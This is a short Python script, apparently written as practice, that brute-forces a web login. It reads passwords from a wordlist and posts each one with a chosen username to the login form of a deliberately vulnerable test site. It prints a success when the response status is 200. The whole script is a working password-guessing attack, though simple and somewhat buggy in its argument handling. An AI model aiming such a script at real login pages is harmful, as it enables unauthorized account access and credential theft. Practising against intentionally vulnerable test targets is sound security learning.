from pathlib import Path

import requests
import sys
n = len(sys.argv)
wordlist = "book2.txt"
print("total arguments passed: " + str(n))
print("1st argument: " + sys.argv[0])
#username= "test"
isUsernameCommand = False
"""
if (n % 2 == 0):
    for i in range (1, n):
        if (sys.argv[i] == "-u"):
            isUsernameCommand = True
"""

if (n > 2) and (sys.argv[1] == "-b" and Path(sys.argv[2]).is_file()):
    wordlist = sys.argv[2]
else:
    print("No command line arguments detected, using defaults")
    wordlist = "book2.txt"

if (n > 2) and (sys.argv[1] == "-u"):
    username = sys.argv[2]
else:
    print("No command line arguments detected, using defaults")
    username = "test"

username
url="http://testphp.vulnweb.com/userinfo.php"
with open(wordlist) as thefile:
    for line in thefile:
        password = line.rstrip() # rstrip removes trailing newlines from an input (before this 'line' is "word\n")
        payload = {"uname":username, "pass":password}
        request = requests.post (url, data=payload, allow_redirects=False)
        if request. status_code == 200:
            print(username + "logged in with " + password)

